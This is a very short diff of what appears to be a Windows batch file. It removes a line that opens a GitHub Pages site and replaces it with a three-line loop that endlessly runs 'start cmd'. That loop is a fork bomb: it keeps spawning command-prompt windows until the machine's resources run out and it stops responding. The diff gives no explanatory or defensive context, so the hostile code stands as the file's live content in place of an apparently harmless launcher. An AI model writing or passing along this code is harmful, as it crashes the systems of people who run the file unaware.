@@ -1,1 +1,3 @@
-start https://mrcubecode.github.io/Cube-SITE/
+i:
+start cmd
+goto i
